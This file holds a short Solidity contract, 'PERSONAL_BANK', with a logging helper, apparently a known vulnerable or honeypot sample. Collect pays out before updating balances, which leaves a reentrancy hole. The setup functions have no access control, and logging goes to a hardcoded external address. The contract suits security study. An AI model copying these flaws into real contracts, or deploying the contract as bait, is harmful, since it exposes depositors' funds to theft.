pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) private x;   
    uint private y = 1 ether;    
    LogFile z = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    bool a;
    
    function SetMinSum(uint _val) public {
        if(a)revert();
        y = _val;
    }
    
    function SetLogFile(address _log) public {
        if(a)revert();
        z = LogFile(_log);
    }
    
    function Initialized() public {
        a = true;
    }
    
    function Deposit() public payable {
        x[msg.sender]+= msg.value;
        z.AddMessage(msg.sender,msg.value,"Put");
    }
    
    function Collect(uint _am) public payable {
        if(x[msg.sender]>=y && x[msg.sender]>=_am) {
            if(msg.sender.call.value(_am)()) {
                x[msg.sender]-=_am;
                z.AddMessage(msg.sender,_am,"Collect");
            }
        }
    }
    
    function() public payable {
        Deposit();
    }
}

contract LogFile
{
    struct Message {
        address A;
        string  B;
        uint C;
        uint  D;
    }
    
    Message[] private E;
    
    Message F;
    
    function AddMessage(address _adr,uint _val,string _data) public {
        F.A = _adr;
        F.D = now;
        F.C = _val;
        F.B = _data;
        E.push(F);
    }
}